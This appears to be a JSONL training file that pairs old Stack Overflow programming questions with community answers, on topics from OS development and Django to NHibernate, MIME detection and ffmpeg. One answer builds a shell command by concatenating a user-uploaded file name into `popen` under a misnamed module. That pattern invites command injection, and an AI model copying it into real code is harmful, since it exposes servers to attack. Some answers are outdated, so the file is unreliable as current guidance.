{"instruction": "One thing I've always wanted to do is develop my very own operating system (not necessarily fancy like Linux or Windows, but better than a simple boot loader which I've already done).\nI'm having a hard time finding resources/guides that take you past writing a simple \"Hello World\" OS.  \nI know lots of people will probably recommend I look at Linux or BSD; but the code base for systems like that is (presumably) so big that I wouldn't know where to start.\nAny suggestions?\nUpdate: To make it easier for people who land on this post through Google here are some OS development resources:\n\nWriting Your Own Operating System (Thanks Adam)\nLinux From Scratch (Thanks John)\nSharpOS (C# Operating System) (Thanks lomaxx)\nMinix3 and Minix2 (Thanks Mike)\nOS Dev Wiki and Forums (Thanks Steve)\nBonaFide (Thanks Steve)\nBran (Thanks Steve)\nRoll your own toy UNIX-clone OS (Thanks Steve)\nBroken Thorn OS Development Series\n\nOther resources:\nI found a nice resource named MikeOS, \"MikeOS is a learning tool to demonstrate how simple OSes work. It uses 16-bit real mode for BIOS access, so that it doesn't need complex drivers\"\nUpdated 11/14/08 \nI found some resources at Freebyte's Guide to...Free and non-free Operating Systems that links to kits such as OSKit and ExOS library.  These seem super useful in getting started in OS development.\nUpdated 2/23/09\nRic Tokyo recommended nanoos in this question.  Nanoos is an OS written in C++.\nUpdated 3/9/09\nDinah provided some useful Stack Overflow discussion of aspiring OS developers: Roadblocks in creating a custom operating system discusses what pitfalls you might encounter while developing an OS\nand OS Development is a more general discussion.\nUpdated 7/9/09\nLB provided a link to the Pintos Project, an education OS designed for students learning OS development.\nUpdated 7/27/09 (Still going strong!)\nI stumbled upon an online OS course from Berkley featuring 23 lectures.\nTomOS is a fork of MikeOS that includes a little memory manager and mouse support. As MikeOS, it is designed to be an educational project.  It is written in NASM assembler.\nUpdated 8/4/09\nI found the slides and other materials to go along with the online Berkeley lectures listed above. \nUpdated 8/23/09\nAll questions tagged osdev on stackoverflow\nOS/161 is an academic OS written in c that runs on a simulated hardware.  This OS is similar in Nachos.  Thanks Novelocrat!\ntangurena recommends http://en.wikipedia.org/wiki/MicroC/OS-II, an OS designed for embedded systems.  There is a companion book as well.\nLinux Kernel Development by Robert Love is suggested by Anders.  It is a \"widely acclaimed insider's look at the Linux kernel.\"\nUpdated 9/18/2009\nThanks Tim S. Van Haren for telling us about Cosmos, an OS written entirely in c#.\ntgiphil tells us about Managed Operating System Alliance (MOSA) Framework, \"a set of tools, specifications and source code to foster development of managed operating systems based on the Common Intermediate Language.\"\nUpdate 9/24/2009\nSteve found a couple resources for development on windows using Visual Studio, check out BrokenThorn's guide setup with VS 2005 or OSDev's VS Section.\nUpdate 1/20/2012\nA set of tutorials aims to take you through programming a simple UNIX-clone operating system for the x86 architecture.\nJamesM's kernel development tutorials\nUpdated 9/5/2012\nkerneltrap.org is no longer available.  The linux kernel v0.01 is available from kernel.org\nUpdated 12/21/2012\nA basic OS development tutorial designed to be a semester's project. It guides you through to build an OS with basic components. Very good start for beginners. Related paper.  Thanks Srujan!\nUpdated 11/15/2013\nWriting a Simple Operating System From Scratch.  Thanks James Moore!\nUpdated 12/8/2013\nHow to make a computer operating system  Thanks ddtoni!\nUpdated 3/18/2014\nToAruOS an OS built mostly from scratch, including GUI\nUpdated Sept 12 2016\nWriting your own Toy Operating System", "output": "You might want to look at linuxfromscratch.\n\nLinux From Scratch (LFS) is a project\n  that provides you with step-by-step\n  instructions for building your own\n  custom Linux system, entirely from\n  source code."}
{"instruction": "In Django's template language, you can use {% url [viewname] [args] %} to generate a URL to a specific view with parameters. How can you programatically do the same in Python code?\nWhat I need is to create a list of menu items where each item has name, URL, and an active flag  (whether it's the current page or not). This is because it will be a lot cleaner to do this in Python than the template language.", "output": "If you need to use something similar to the {% url %} template tag in your code, Django provides the django.core.urlresolvers.reverse(). The reverse function has the following signature:\nreverse(viewname, urlconf=None, args=None, kwargs=None)\n\nhttps://docs.djangoproject.com/en/dev/ref/urlresolvers/"}
{"instruction": "The .NET System.Security.Cryptography namespace has a rather bewildering collection of algorithms that I could use for encryption of credit card details. Which is the best?\nIt clearly needs to be secure for a relatively short string. \nEDIT: I'm in the UK, where I understand we're OK storing encrypted credit card details so long as the three-digit CVV number is never stored. And thanks all for the great responses.", "output": "It it doesn't matter.\nFull card numbers should never touch disk. \nAll that matters is the auth code.\nFor traces etc you will only use the last 4 digits xxxx xxxx xxxx 1234 and expire date.\nIf you are to store card numbers the cryptography choice will be mandated by the acquiring bank.\nUnless you are the acquirer, which case there should be an old unix programmer/db2 guy that you should ask.\n\"Can't you store it locally at the client in a cookie\"  <-- NEVER"}
{"instruction": "The .NET System.Security.Cryptography namespace has a rather bewildering collection of algorithms that I could use for encryption of credit card details. Which is the best?\nIt clearly needs to be secure for a relatively short string. \nEDIT: I'm in the UK, where I understand we're OK storing encrypted credit card details so long as the three-digit CVV number is never stored. And thanks all for the great responses.", "output": "There's also the legal aspect to consider. I don't know the situation elsewhere but in Germany you're simply not allowed to store credit card numbers1). Period. It doesn't matter whether you encrypt them or not and in what format you store them.\nAll you may do (and here I'm referring from memory, without any judicial knowledge) is store a strong hash (SHA-256?) of the credit card number, along with the last four digits and the account number. And yes, it's trivial to rebuild the complete number from these information alone. Laws aren't always logical.\n\n1) Except if you're a federally certified credit card institute."}
{"instruction": "The .NET System.Security.Cryptography namespace has a rather bewildering collection of algorithms that I could use for encryption of credit card details. Which is the best?\nIt clearly needs to be secure for a relatively short string. \nEDIT: I'm in the UK, where I understand we're OK storing encrypted credit card details so long as the three-digit CVV number is never stored. And thanks all for the great responses.", "output": "Hint: You should investigate if it's legal to store credit card numbers. In Sweden for example you will have to be certified by PCI (Payment Card Industry), where your internal and external security will be tested (a long with a lot of other things).\nYou should think both once or twice before storing credit card information, since the legal costs of doing it wrong might be expensive."}
{"instruction": "The .NET System.Security.Cryptography namespace has a rather bewildering collection of algorithms that I could use for encryption of credit card details. Which is the best?\nIt clearly needs to be secure for a relatively short string. \nEDIT: I'm in the UK, where I understand we're OK storing encrypted credit card details so long as the three-digit CVV number is never stored. And thanks all for the great responses.", "output": "I'd add to the view that you just plain shouldn't store them unless you have a really really good reason to, and storing them in a cookie is a really bad idea - they're just too easy to get hold of (what happens if someone steals a cookie - then it won't matter how encrypted it is).\nIf you need to do repeat payments, most CC providers will offer a way to do this by storing some kind of token from the initial payment, without keeping the card number at all (you could just keep the last 4 digits to display to the customer so that they know which card is stored).\nReally, just don't do it!\nAlso you should never ever ever ever keep the CCV code."}
{"instruction": "When it comes to web-design, I am horrible at producing anything remotely good looking. Thankfully there are a lot of free sources for design templates. However, a problem with these designs is that they just cover a single page, and not many use cases. If you take a look at CSS Zen Gardens, they have 1 single HTML file, and can radically style it differently by just changing the CSS file.\nNow I am wondering if there is a standard HTML layout (tags and ids), that covers alot of use cases, and can be generically themed with different CSS files like Zen Garden. What I am imagining is a set of rules off how you write your html, and what boxes, lists, menus and styles you are supposed to use. A set of standard test pages covering the various uses can be created, and a new CSS file while have to support all the different pages in a nice view.\nIs there any projects that covers anything similar to what I am describing?", "output": "Check out the Grids framework from YUI. Particularly awesome is the Grid Builder. Also, they have a set of reset, base, and font CSS files that will give you a good baseline to build on."}
{"instruction": "When it comes to web-design, I am horrible at producing anything remotely good looking. Thankfully there are a lot of free sources for design templates. However, a problem with these designs is that they just cover a single page, and not many use cases. If you take a look at CSS Zen Gardens, they have 1 single HTML file, and can radically style it differently by just changing the CSS file.\nNow I am wondering if there is a standard HTML layout (tags and ids), that covers alot of use cases, and can be generically themed with different CSS files like Zen Garden. What I am imagining is a set of rules off how you write your html, and what boxes, lists, menus and styles you are supposed to use. A set of standard test pages covering the various uses can be created, and a new CSS file while have to support all the different pages in a nice view.\nIs there any projects that covers anything similar to what I am describing?", "output": "I've used Bluprint CSS, it's easy and useful as you'll see. It also has some ruby scripts that allow you to change the number of columns and the distance between them. By default it's 950px for a span-24 element."}
{"instruction": "When it comes to web-design, I am horrible at producing anything remotely good looking. Thankfully there are a lot of free sources for design templates. However, a problem with these designs is that they just cover a single page, and not many use cases. If you take a look at CSS Zen Gardens, they have 1 single HTML file, and can radically style it differently by just changing the CSS file.\nNow I am wondering if there is a standard HTML layout (tags and ids), that covers alot of use cases, and can be generically themed with different CSS files like Zen Garden. What I am imagining is a set of rules off how you write your html, and what boxes, lists, menus and styles you are supposed to use. A set of standard test pages covering the various uses can be created, and a new CSS file while have to support all the different pages in a nice view.\nIs there any projects that covers anything similar to what I am describing?", "output": "I generally just try to follow the guidelines set by the HTML standard itself. \n\nHeadings go in \"h\" tags (so one H1 tag for the main heading, then one or more H2 tags under that etc).\nFree text gets grouped in paragraphs in P tags.\nLogically-grouped sections of information go in DIV tags.\nAny kind of list (even menus that you eventually might want horizontally laid out) belong in list tags like UL, OL or DL.\nTables of information go in TABLE tags. DON'T use table tags for layout.\nBe smart with your ID and CLASS attributes. Keep IDs unique and assign them to elements that you know represent something unique on the page, like a navigation menu or a page footer. Assign the same class to elements that are repeated but similar (which you might want to render with a similar visual style).\n\nI always start with a very plain, vertical page - just run everything I want down the page in black and white. Then I start adding CSS to make sure the bits are formatted and laid out the way I want.\nTake a look at the source of my home page for an example of what I'm talking about."}
{"instruction": "When it comes to web-design, I am horrible at producing anything remotely good looking. Thankfully there are a lot of free sources for design templates. However, a problem with these designs is that they just cover a single page, and not many use cases. If you take a look at CSS Zen Gardens, they have 1 single HTML file, and can radically style it differently by just changing the CSS file.\nNow I am wondering if there is a standard HTML layout (tags and ids), that covers alot of use cases, and can be generically themed with different CSS files like Zen Garden. What I am imagining is a set of rules off how you write your html, and what boxes, lists, menus and styles you are supposed to use. A set of standard test pages covering the various uses can be created, and a new CSS file while have to support all the different pages in a nice view.\nIs there any projects that covers anything similar to what I am describing?", "output": "BluePrintCSS was, from what I know, the first CSS framework.\nAs YUI CSS Framework, It's help you to handle layout.\nThat kind of framework will help you to build multiple CSS for your site.\nBluePrintCSS is a quite mature project so I encourage you to check it out."}
{"instruction": "This is a poll asking the Stackoverflow community what non-programming books they would recommend to fellow programmers.\nPlease read the following before posting:\n\nPlease post only ONE BOOK PER ANSWER.\nPlease search for your recommendation on this page before posting (there are over NINE PAGES so it is advisable to check them all). Many books have already been suggested and we want to avoid duplicates. If you find your recommendation is already present, vote it up or add some commentary.\nPlease elaborate on why you think a given book is worth reading from a programmer's perspective.\n\nNote: this article is similar and contains other useful suggestions.", "output": "One Flew Over the Cuckoo's Nest by Ken Kesey\nTotally unrelated to software development, but highly entertaining. Teaches a lot about human behaviour and interaction. Might help you out if your manager's a Nurse Ratched...\nThe movie was good too."}
{"instruction": "This is a poll asking the Stackoverflow community what non-programming books they would recommend to fellow programmers.\nPlease read the following before posting:\n\nPlease post only ONE BOOK PER ANSWER.\nPlease search for your recommendation on this page before posting (there are over NINE PAGES so it is advisable to check them all). Many books have already been suggested and we want to avoid duplicates. If you find your recommendation is already present, vote it up or add some commentary.\nPlease elaborate on why you think a given book is worth reading from a programmer's perspective.\n\nNote: this article is similar and contains other useful suggestions.", "output": "Snow Crash By Neal Stephenson"}
{"instruction": "I once worked with an architect who banned the use of SQL views. His main reason was that views made it too easy for a thoughtless coder to needlessly involve joined tables which, if that coder tried harder, could be avoided altogether.  Implicitly he was encouraging code reuse via copy-and-paste instead of encapsulation in views.\nThe database had nearly 600 tables and was highly normalised, so most of the useful SQL was necessarily verbose.\nSeveral years later I can see at least one bad outcome from the ban - we have many hundreds of dense, lengthy stored procs that verge on unmaintainable.\nIn hindsight I would say it was a bad decision, but what are your experiences with SQL views?  Have you found them bad for performance? Any other thoughts on when they are or are not appropriate?", "output": "One thing that hasn't been mentioned thus far is use of views to provide a logical picture of the data to end users for ad hoc reporting or similar.\nThis has two merits:\n\nTo allow the user to single \"tables\" containing the data they expect rather requiring relatively non technical users to work out potentially complex joins (because the database is normalised)\nIt provides a means to allow some degree of ah hoc access without exposing the data or the structure to the end users.\n\nEven with non ad-hoc reporting its sometimes signicantly easier to provide a view to the reporting system that contains the relveant data, neatly separating production of data from presentation of same."}
{"instruction": "I once worked with an architect who banned the use of SQL views. His main reason was that views made it too easy for a thoughtless coder to needlessly involve joined tables which, if that coder tried harder, could be avoided altogether.  Implicitly he was encouraging code reuse via copy-and-paste instead of encapsulation in views.\nThe database had nearly 600 tables and was highly normalised, so most of the useful SQL was necessarily verbose.\nSeveral years later I can see at least one bad outcome from the ban - we have many hundreds of dense, lengthy stored procs that verge on unmaintainable.\nIn hindsight I would say it was a bad decision, but what are your experiences with SQL views?  Have you found them bad for performance? Any other thoughts on when they are or are not appropriate?", "output": "Some time ago I've tried to maintain code that used views built from views built from views... That was a pain in the a**, so I got a little allergic to views :)\nI usually prefer working with tables directly, especially for web applications where speed is a main concern. When accessing tables directly you have the chance to tweak your SQL-Queries to achieve the best performance. \"Precompiled\"/cached working plans might be one advantage of views, but in many cases just-in-time compilation with all given parameters and where clauses in consideration will result in faster processing over all.\nHowever that does not rule out views totally, if used adequately. For example you can use a view with the \"users\" table joined with the \"users_status\" table to get an textual explanation for each status - if you need it. However if you don't need the explanation: use the \"users\" table, not the view. As always: Use your brain!"}
{"instruction": "When is this called? More specifically, I have a control I'm creating - how can I release handles when the window is closed. In normal win32 I'd do it during wm_close - is DestroyHandle the .net equivalent?\n\nI don't want to destroy the window handle myself - my control is listening for events on another object and when my control is destroyed, I want to stop listening to those events. Eg:\nvoid Dispose(bool disposing) {\n    otherObject.Event -= myEventHandler;\n}", "output": "Normally DestroyHandle is being called in Dispose method. So you need to make sure that all controls are disposed to avoid resource leaks."}
{"instruction": "I would like to compare the contents of a couple of collections in my Equals method.  I have a Dictionary and an IList.  Is there a built-in method to do this?\nEdited:\nI want to compare two Dictionaries and two ILists, so I think what equality means is clear - if the two dictionaries contain the same keys mapped to the same values, then they're equal.", "output": "No, because the framework doesn't know how to compare the contents of your lists.\nHave a look at this:\nhttp://blogs.msdn.com/abhinaba/archive/2005/10/11/479537.aspx"}
{"instruction": "I would like to compare the contents of a couple of collections in my Equals method.  I have a Dictionary and an IList.  Is there a built-in method to do this?\nEdited:\nI want to compare two Dictionaries and two ILists, so I think what equality means is clear - if the two dictionaries contain the same keys mapped to the same values, then they're equal.", "output": "Enumerable.SequenceEqual\n\nDetermines whether two sequences are equal by comparing their elements by using a specified IEqualityComparer(T).\n\nYou can't directly compare the list & the dictionary, but you could compare the list of values from the Dictionary with the list"}
{"instruction": "I would like to compare the contents of a couple of collections in my Equals method.  I have a Dictionary and an IList.  Is there a built-in method to do this?\nEdited:\nI want to compare two Dictionaries and two ILists, so I think what equality means is clear - if the two dictionaries contain the same keys mapped to the same values, then they're equal.", "output": "Take a look at the Enumerable.SequenceEqual  method\nvar dictionary = new Dictionary<int, string>() {{1, \"a\"}, {2, \"b\"}};\nvar intList = new List<int> {1, 2};\nvar stringList = new List<string> {\"a\", \"b\"};\nvar test1 = dictionary.Keys.SequenceEqual(intList);\nvar test2 = dictionary.Values.SequenceEqual(stringList);"}
{"instruction": "I would like to compare the contents of a couple of collections in my Equals method.  I have a Dictionary and an IList.  Is there a built-in method to do this?\nEdited:\nI want to compare two Dictionaries and two ILists, so I think what equality means is clear - if the two dictionaries contain the same keys mapped to the same values, then they're equal.", "output": "I didn't know about Enumerable.SequenceEqual method (you learn something every day....), but I was going to suggest using an extension method; something like this:\n    public static bool IsEqual(this List<int> InternalList, List<int> ExternalList)\n    {\n        if (InternalList.Count != ExternalList.Count)\n        {\n            return false;\n        }\n        else\n        {\n            for (int i = 0; i < InternalList.Count; i++)\n            {\n                if (InternalList[i] != ExternalList[i])\n                    return false;\n            }\n        }\n\n        return true;\n\n    }\n\nInterestingly enough, after taking 2 seconds to read about SequenceEqual, it looks like Microsoft has built the function I described for you."}
{"instruction": "I would like to compare the contents of a couple of collections in my Equals method.  I have a Dictionary and an IList.  Is there a built-in method to do this?\nEdited:\nI want to compare two Dictionaries and two ILists, so I think what equality means is clear - if the two dictionaries contain the same keys mapped to the same values, then they're equal.", "output": "No. The collection framework doesn't have any concept of equality. If you think about it there is no way of comparing collections which isn't subjective. For instance comparing your IList to your Dictionary, would they be equal if all the keys were in the IList, all the values were in the IList or if both were in the IList? There is no obvious way of comparing these two collections without knowledge of what they are to be used for so a general purpose equals method makes no sense."}
{"instruction": "When is this called? More specifically, I have a control I'm creating - how can I release handles when the window is closed. In normal win32 I'd do it during wm_close - is DestroyHandle the .net equivalent?\n\nI don't want to destroy the window handle myself - my control is listening for events on another object and when my control is destroyed, I want to stop listening to those events. Eg:\nvoid Dispose(bool disposing) {\n    otherObject.Event -= myEventHandler;\n}", "output": "Dispose does call DestroyHandle, but not always. If I close the parent window, then Windows will destroy all child windows. In this situation Dispose won't call DestroyHandle (since it is already destroyed). In other words, DestroyHandle is called to destroy the window, it is not called when the window is destroyed.\nThe solution is to override either OnHandleDestroyed, or Dispose. I'm opting for Dispose."}
{"instruction": "One of the things that get me thoroughly confused is the use of session.Flush,in conjunction with session.Commit, and session.Close.\nSometimes session.Close works, e.g., it commits all the changes that I need. I know I need to use commit when I have a transaction, or a unit of work with several creates/updates/deletes, so that I can choose to rollback if an error occurs.\nBut sometimes I really get stymied by the logic behind session.Flush. I have seen examples where you have a session.SaveOrUpdate() followed by a flush, but when I remove Flush it works fine anyway. Sometimes I run into errors on the Flush statement saying that the session timed out, and removing it made sure that I didn't run into that error.\nDoes anyone have a good guideline as to where or when to use a Flush? I've checked out the NHibernate documentation for this, but I still can't find a straightforward answer.", "output": "Briefly:\n\nAlways use transactions\nDon't use Close(), instead wrap your calls on an ISession inside a using statement or manage the lifecycle of your ISession somewhere else.\n\nFrom the documentation:\n\nFrom time to time the ISession will execute the SQL statements needed to synchronize the ADO.NET connection's state with the state of objects held in memory. This process, flush, occurs by default at the following points\n\nfrom some invocations of Find() or Enumerable()\nfrom NHibernate.ITransaction.Commit()\nfrom ISession.Flush() \n\nThe SQL statements are issued in the following order\n\nall entity insertions, in the same order the corresponding objects were saved using ISession.Save()\nall entity updates\nall collection deletions\nall collection element deletions, updates and insertions\nall collection insertions\nall entity deletions, in the same order the corresponding objects were deleted using ISession.Delete()\n\n(An exception is that objects using native ID generation are inserted when they are saved.)\nExcept when you explicity Flush(), there are absolutely no guarantees about when the Session executes the ADO.NET calls, only the order in which they are executed. However, NHibernate does guarantee that the ISession.Find(..) methods will never return stale data; nor will they return the wrong data.\nIt is possible to change the default behavior so that flush occurs less frequently. The FlushMode class defines three different modes: only flush at commit time (and only when the NHibernate ITransaction API is used), flush automatically using the explained routine, or never flush unless Flush() is called explicitly. The last mode is useful for long running units of work, where an ISession is kept open and disconnected for a long time.\n\n...\nAlso refer to this section:\n\nEnding a session involves four distinct phases:\n\nflush the session\ncommit the transaction\nclose the session\nhandle exceptions \n\nFlushing the Session\nIf you happen to be using the ITransaction API, you don't need to worry about this step. It will be performed implicitly when the transaction is committed. Otherwise you should call ISession.Flush() to ensure that all changes are synchronized with the database.\nCommitting the database transaction\nIf you are using the NHibernate ITransaction API, this looks like:\ntx.Commit(); // flush the session and commit the transaction\n\nIf you are managing ADO.NET transactions yourself you should manually Commit() the ADO.NET transaction.\nsess.Flush();\ncurrentTransaction.Commit();\n\nIf you decide not to commit your changes:\ntx.Rollback();  // rollback the transaction\n\nor:\ncurrentTransaction.Rollback();\n\nIf you rollback the transaction you should immediately close and discard the current session to ensure that NHibernate's internal state is consistent.\nClosing the ISession\nA call to ISession.Close() marks the end of a session. The main implication of Close() is that the ADO.NET connection will be relinquished by the session.\ntx.Commit();\nsess.Close();\n\nsess.Flush();\ncurrentTransaction.Commit();\nsess.Close();\n\nIf you provided your own connection, Close() returns a reference to it, so you can manually close it or return it to the pool. Otherwise Close() returns it to the pool."}
{"instruction": "Let's say you want to save a bunch of files somewhere, for instance in BLOBs. Let's say you want to dish these files out via a web page and have the client automatically open the correct application/viewer.\nAssumption: The browser figures out which application/viewer to use by the mime-type (content-type?) header in the HTTP response.\nBased on that assumption, in addition to the bytes of the file, you also want to save the MIME type.\nHow would you find the MIME type of a file? I'm currently on a Mac, but this should also work on Windows. \nDoes the browser add this information when posting the file to the web page?\nIs there a neat python library for finding this information? A WebService or (even better) a downloadable database?", "output": "The mimetypes module in the standard library will determine/guess the MIME type from a file extension.\nIf users are uploading files the HTTP post will contain the MIME type of the file alongside the data.  For example, Django makes this data available as an attribute of the UploadedFile object."}
{"instruction": "How do you give a C# Auto-Property a default value?  I either use the constructor, or revert to the old syntax. \n Using the Constructor:\nclass Person \n{\n    public Person()\n    {\n        Name = \"Default Name\";\n    }\n    public string Name { get; set; }\n}\n\nUsing normal property syntax  (with a default value)\nprivate string name = \"Default Name\";\npublic string Name \n{\n    get \n    {\n        return name;\n    }\n    set\n    {\n        name = value;\n    }\n}\n\nIs there a better way?", "output": "When you inline an initial value for a variable it will be done implicitly in the constructor anyway.\nI would argue that this syntax was best practice in C# up to 5:\nclass Person \n{\n    public Person()\n    {\n        //do anything before variable assignment\n\n        //assign initial values\n        Name = \"Default Name\";\n\n        //do anything after variable assignment\n    }\n    public string Name { get; set; }\n}\n\nAs this gives you clear control of the order values are assigned.\nAs of C#6 there is a new way:\npublic string Name { get; set; } = \"Default Name\""}
{"instruction": "Let's say you want to save a bunch of files somewhere, for instance in BLOBs. Let's say you want to dish these files out via a web page and have the client automatically open the correct application/viewer.\nAssumption: The browser figures out which application/viewer to use by the mime-type (content-type?) header in the HTTP response.\nBased on that assumption, in addition to the bytes of the file, you also want to save the MIME type.\nHow would you find the MIME type of a file? I'm currently on a Mac, but this should also work on Windows. \nDoes the browser add this information when posting the file to the web page?\nIs there a neat python library for finding this information? A WebService or (even better) a downloadable database?", "output": "You didn't state what web server you were using, but Apache has a nice little module called Mime Magic which it uses to determine the type of a file when told to do so.  It reads some of the file's content and tries to figure out what type it is based on the characters found.  And as Dave Webb Mentioned the MimeTypes Module under python will work, provided an extension is handy.\nAlternatively, if you are sitting on a UNIX box you can use sys.popen('file -i ' + fileName, mode='r') to grab the MIME type.  Windows should have an equivalent command, but I'm unsure as to what it is."}
{"instruction": "Is there a way using Python's standard library to easily determine (i.e. one function call) the last day of a given month?\nIf the standard library doesn't support that, does the dateutil package support this?", "output": "I didn't notice this earlier when I was looking at the documentation for the calendar module, but a method called monthrange provides this information:\n\nmonthrange(year, month)\n  \u00a0\u00a0\u00a0\u00a0Returns weekday of first day of the month and number of days in month, for the specified year and month. \n\n>>> import calendar\n>>> calendar.monthrange(2002,1)\n(1, 31)\n>>> calendar.monthrange(2008,2)\n(4, 29)\n>>> calendar.monthrange(2100,2)\n(0, 28)\n\nso:\ncalendar.monthrange(year, month)[1]\n\nseems like the simplest way to go.\nJust to be clear, monthrange supports leap years as well:\n>>> from calendar import monthrange\n>>> monthrange(2012, 2)\n(2, 29)\n\nMy previous answer still works, but is clearly suboptimal."}
{"instruction": "I need to implement a 4-to-1 function in Veriog.  The input is 4 bits, a number from 0-15.  The output is a single bit, 0 or 1.  Each input gives a different output and the mapping from inputs to outputs is known, but the inputs and outputs themselves are not.  I want vcs to successfully optimizing the code and also have it be as short/neat as possible.  My solution so far:\nwire [3:0] a;\nwire b;\nwire [15:0] c;\n\nassign c = 16'b0100110010111010; //for example but could be any constant\nassign b = c[a];\n\nHaving to declare c is ugly and I don't know if vcs will recognize the K-map there.  Will this work as well as a case statement or an assignment in conjunctive normal form?", "output": "I totally agree with Dallas. Use a case statement - it makes your intent clearer.  The synthesis tool will build it as a look-up table (if it's parallel) and will optimise whatever it can.\nAlso, I wouldn't worry so much about keeping your RTL code short.  I'd shoot for clarity first.  Synthesis tools are cleverer than you think..."}
{"instruction": "OK, this kind of follows on from my previous question.\nWhat I would really like to do is create some sort of attribute which allows me to decorate a method that will break the build. Much like the Obsolete(\"reason\", true) attribute, but without falsely identifying obsolete code.\nTo clarify: I dont want it to break the build on ANY F6 (Build) press, I only want it to break the build if a method decorated with the attribute is called somewhere else in the code. Like I said, similar to obsolete, but not the same.\nI know I am not alone in this, since other users want to use it for other reasons. I have never created custom attributes before so it is all new to me!", "output": "I think this would be an excellent feature request for Microsoft: Create an abstract base class attribute CompilerExecutedAttribute that the compiler processes in some manner or that can influence the compiling process. Then we could inherit from this attribute and implement different operations, e.g. emit an error or a warning."}
{"instruction": "I want to see all the different ways you can come up with, for a factorial subroutine, or program. The hope is that anyone can come here and see if they might want to learn a new language.\nIdeas:\n\nProcedural\nFunctional\nObject Oriented\nOne liners\nObfuscated\nOddball\nBad Code\nPolyglot\n\nBasically I want to see an example, of different ways of writing an algorithm, and what they would look like in different languages.\nPlease limit it to one example per entry.\nI will allow you to have more than one example per answer, if you are trying to highlight a specific style, language, or just a well thought out idea that lends itself to being in one post.\nThe only real requirement is it must find the factorial of a given argument, in all languages represented.\nBe Creative!\nRecommended Guideline:\n\n# Language Name: Optional Style type\n\n   - Optional bullet points\n\n    Code Goes Here\n\nOther informational text goes here\n\nI will ocasionally go along and edit any answer that does not have decent formatting.", "output": "Delphi\nfacts: array[2..12] of integer;\n\nfunction TForm1.calculate(f: integer): integer;\nbegin\n    if f = 1 then\n      Result := f\n    else if f > High(facts) then\n      Result := High(Integer)\n    else if (facts[f] > 0) then\n      Result := facts[f]\n    else begin\n      facts[f] := f * Calculate(f-1);\n      Result := facts[f];\n    end;\nend;\n\ninitialize\n\n  for i := Low(facts) to High(facts) do\n    facts[i] := 0;\n\nAfter the first time a factorial higher or equal to the desired value has been calculated, this algorithm just returns the factorial in constant time O(1).\nIt takes in account that int32 only can hold up to 12!"}
{"instruction": "I am looking for a way to concatenate the strings of a field within a group by query. So for example, I have a table:\nID   COMPANY_ID   EMPLOYEE\n1    1            Anna\n2    1            Bill\n3    2            Carol\n4    2            Dave\n\nand I wanted to group by company_id to get something like:\nCOMPANY_ID   EMPLOYEE\n1            Anna, Bill\n2            Carol, Dave\n\nThere is a built-in function in mySQL to do this group_concat", "output": "I claim no credit for the answer because I found it after some searching:\nWhat I didn't know is that PostgreSQL allows you to define your own aggregate functions with CREATE AGGREGATE\nThis post on the PostgreSQL list shows how trivial it is to create a function to do what's required:\nCREATE AGGREGATE textcat_all(\n  basetype    = text,\n  sfunc       = textcat,\n  stype       = text,\n  initcond    = ''\n);\n\nSELECT company_id, textcat_all(employee || ', ')\nFROM mytable\nGROUP BY company_id;"}
{"instruction": "Original Question\nI want to be able to generate a new (fully valid) MP3 file from an existing MP3 file to be used as a preview -- try-before-you-buy style. The new file should only contain the first n seconds of the track.\nNow, I know I could just \"chop the stream\" at n seconds (calculating from the bitrate and header size) when delivering the file, but this is a bit dirty and a real PITA on a VBR track. I'd like to be able to generate a proper MP3 file.\nAnyone any ideas?\nAnswers\nBoth mp3split and ffmpeg are both good solutions. I chose ffmpeg as it is commonly installed on linux servers and is also easily available for windows.  Here's some more good command line parameters for generating previews with ffmpeg\n\n-t <seconds> chop after specified number of seconds\n-y force file overwrite\n-ab <bitrate> set bitrate e.g. -ab 96k\n-ar <rate Hz> set sampling rate e.g. -ar 22050 for 22.05kHz\n-map_meta_data <outfile>:<infile> copy track metadata from infile to outfile\n\ninstead of setting -ab and -ar, you can copy the original track settings, as Tim Farley suggests, with:\n\n-acodec copy", "output": "I haven't used it for this specific purpose, but I bet ffmpeg can do it."}
{"instruction": "Original Question\nI want to be able to generate a new (fully valid) MP3 file from an existing MP3 file to be used as a preview -- try-before-you-buy style. The new file should only contain the first n seconds of the track.\nNow, I know I could just \"chop the stream\" at n seconds (calculating from the bitrate and header size) when delivering the file, but this is a bit dirty and a real PITA on a VBR track. I'd like to be able to generate a proper MP3 file.\nAnyone any ideas?\nAnswers\nBoth mp3split and ffmpeg are both good solutions. I chose ffmpeg as it is commonly installed on linux servers and is also easily available for windows.  Here's some more good command line parameters for generating previews with ffmpeg\n\n-t <seconds> chop after specified number of seconds\n-y force file overwrite\n-ab <bitrate> set bitrate e.g. -ab 96k\n-ar <rate Hz> set sampling rate e.g. -ar 22050 for 22.05kHz\n-map_meta_data <outfile>:<infile> copy track metadata from infile to outfile\n\ninstead of setting -ab and -ar, you can copy the original track settings, as Tim Farley suggests, with:\n\n-acodec copy", "output": "try:\nffmpeg -t 30 -i inputfile.mp3 outputfile.mp3"}
{"instruction": "Original Question\nI want to be able to generate a new (fully valid) MP3 file from an existing MP3 file to be used as a preview -- try-before-you-buy style. The new file should only contain the first n seconds of the track.\nNow, I know I could just \"chop the stream\" at n seconds (calculating from the bitrate and header size) when delivering the file, but this is a bit dirty and a real PITA on a VBR track. I'd like to be able to generate a proper MP3 file.\nAnyone any ideas?\nAnswers\nBoth mp3split and ffmpeg are both good solutions. I chose ffmpeg as it is commonly installed on linux servers and is also easily available for windows.  Here's some more good command line parameters for generating previews with ffmpeg\n\n-t <seconds> chop after specified number of seconds\n-y force file overwrite\n-ab <bitrate> set bitrate e.g. -ab 96k\n-ar <rate Hz> set sampling rate e.g. -ar 22050 for 22.05kHz\n-map_meta_data <outfile>:<infile> copy track metadata from infile to outfile\n\ninstead of setting -ab and -ar, you can copy the original track settings, as Tim Farley suggests, with:\n\n-acodec copy", "output": "You might want to try Mp3Splt.\nI've used it before in a C# service that simply wrapped the mp3splt.exe win32 process.  I assume something similar could be done in your Linux/PHP scenario."}
